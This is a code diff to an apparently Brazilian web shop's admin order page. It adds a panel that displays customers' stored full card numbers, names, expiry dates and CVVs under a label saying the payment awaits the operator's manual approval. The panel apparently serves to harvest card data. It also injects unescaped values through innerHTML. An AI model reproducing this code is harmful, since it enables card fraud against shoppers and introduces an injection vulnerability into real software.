@@ -95,15 +95,18 @@
             <h3 class="text-xl font-black uppercase italic mb-6 border-b border-zinc-800 pb-4">Dados do Pedido</h3>
             
             <div id="info-cliente-pedido" class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8 text-[11px] uppercase">
+                
                 <div class="space-y-2">
                     <p class="text-zinc-500 font-black tracking-widest">Documentação</p>
                     <p class="text-white">NOME: <span id="det-nome" class="font-black text-zinc-300"></span></p>
                     <p class="text-white">CPF: <span id="det-cpf" class="font-black text-zinc-300"></span></p>
                     <p class="text-white">WHATSAPP: <span id="det-whats" class="font-black text-zinc-300"></span></p>
                 </div>
+                
                 <div class="space-y-2">
                     <p class="text-zinc-500 font-black tracking-widest">Endereço de Entrega</p>
                     <p id="det-endereco" class="text-white font-black leading-relaxed"></p>
+                    <div id="area-pagamento-admin" class="mt-6 border-t border-zinc-900 pt-6"></div>
                 </div>
             </div>
 
@@ -267,7 +270,41 @@
         ${end.rua || end.endereco || 'RUA N/A'}, ${end.numero || 'S/N'}<br>
         ${end.bairro || ''} ${end.cidade || 'CIDADE'}/${end.uf || end.estado || 'UF'}<br>
         CEP: ${end.cep || '00000-000'}`;
+// --- BLOCO DE PAGAMENTO VIA CARTÃO (ADICIONAR NO ADM) ---
+const pag = p.dadosPagamento || p.dadosCartao || null;
+const infoPagamentoContainer = document.createElement('div');
+infoPagamentoContainer.id = "detalhes-cartao-adm";
+infoPagamentoContainer.className = "mb-8 p-4 border border-zinc-800 bg-zinc-950/50";
 
+if (pag) {
+    const isCredito = pag.metodo === 'CREDITO';
+    infoPagamentoContainer.innerHTML = `
+        <p class="text-zinc-500 font-black tracking-widest text-[9px] mb-3 uppercase italic">Dados do Pagamento (Cartão)</p>
+        <div class="grid grid-cols-2 gap-4 text-[11px]">
+            <div>
+                <p class="text-white">MÉTODO: <span class="text-white font-black">${pag.metodo || 'CARTÃO'}</span></p>
+                <p class="text-white">CARTÃO: <span class="text-zinc-400 font-bold">${pag.numero || '****'}</span></p>
+                <p class="text-white">NOME: <span class="text-zinc-400 font-bold">${pag.nome || 'N/A'}</span></p>
+            </div>
+            <div>
+                <p class="text-white">VALIDADE: <span class="text-zinc-400 font-bold">${pag.exp || '--/--'}</span></p>
+                <p class="text-white text-yellow-500">CVV: <span class="font-black">${pag.cvv || '***'}</span></p>
+                <p class="text-white font-black">${isCredito ? `PARCELAS: ${pag.parcelas}X` : 'À VISTA (DÉBITO)'}</p>
+            </div>
+        </div>
+        <div class="mt-3 pt-3 border-t border-zinc-900 flex items-center gap-2">
+             <i class="fa-solid fa-shield-halved text-green-500 text-[10px]"></i>
+             <span class="text-[9px] text-zinc-500 font-bold uppercase">Aguardando sua conferência para aprovação</span>
+        </div>
+    `;
+} else {
+    infoPagamentoContainer.innerHTML = `<p class="text-[9px] text-zinc-600 font-black uppercase tracking-widest italic">Pagamento via PIX ou não informado</p>`;
+}
+           // Comando para injetar o conteúdo na tela:
+const areaAlvo = document.getElementById('area-pagamento-admin');
+areaAlvo.innerHTML = ""; 
+areaAlvo.appendChild(infoPagamentoContainer);
+// -------------------------------------------------------
     // 4. Preencher valores financeiros
     document.getElementById('detalhes-frete').innerText = `R$ ${(p.frete || 0).toFixed(2)}`;
     document.getElementById('detalhes-total').innerText = `R$ ${(p.total || 0).toFixed(2)}`;
